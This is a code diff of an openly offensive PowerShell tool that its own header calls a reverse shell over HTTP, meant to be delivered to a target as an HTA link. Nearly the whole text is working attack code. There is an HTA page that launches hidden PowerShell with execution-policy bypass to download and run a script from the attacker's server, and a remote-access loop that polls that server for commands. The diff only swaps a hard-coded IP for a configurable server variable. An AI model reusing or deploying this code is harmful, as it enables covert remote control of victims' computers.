@@ -1,7 +1,15 @@
 <#
-  Simply Invoke the Script and send the target a link to http://192.168.1.1/app.hta
-  To change your server, simply find and replace 192.168.1.1 with your server in the code.
+  .SYNOPSIS
+  
+  Simple Reverse Shell over HTTP. Deliver the link to the target and wait for connectback.
+  
+  .PARAMETER Server
+  
+  Listening Server IP Address
+  
 #>
+
+$Server = '127.0.0.1' #Listening IP. Change This.
 
 function Receive-Request {
    param(      
@@ -35,7 +43,7 @@ while ($true) {
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
      write-host "Host Connected" -fore Cyan
         $message = '
-					$s = "http://192.168.1.1/rat"
+					$s = "http://' + $Server + '/rat"
 					$w = New-Object Net.WebClient 
 					while($true)
 					{
@@ -63,8 +71,8 @@ while ($true) {
 		$htacode = '<html>
 					  <head>
 						<script>
-						var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring(''http://192.168.1.1/connect''))\"\"";
-						new ActiveXObject(''WScript.Shell'').Run(c);
+						var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring(''http://' + $Server + '/connect''))\"\"";' + 
+						'new ActiveXObject(''WScript.Shell'').Run(c);
 						</script>
 					  </head>
 					  <body>
